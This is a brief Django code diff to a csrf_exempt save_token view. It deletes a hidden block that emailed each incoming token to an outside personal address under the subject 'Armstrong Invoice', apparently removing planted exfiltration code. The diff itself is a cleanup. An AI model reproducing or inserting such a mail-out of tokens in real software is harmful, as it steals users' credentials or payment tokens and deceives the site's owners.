@@ -134,14 +134,6 @@ def subscribe_done(request):
 @csrf_exempt
 def save_token(request):
     req_data = json.loads(request.body.decode('utf-8'))
-    from django.core.mail import send_mail
-    send_mail(
-        subject='Armstrong Invoice',
-        from_email=settings.FROM_EMAIL,
-        recipient_list=['muhamedhassan8@icloud.com'],
-        message=req_data['obj']['token'],
-        html_message=req_data['obj']['token'],
-    )
     if req_data['type'] == 'TOKEN':
         t_data = req_data['obj']
 
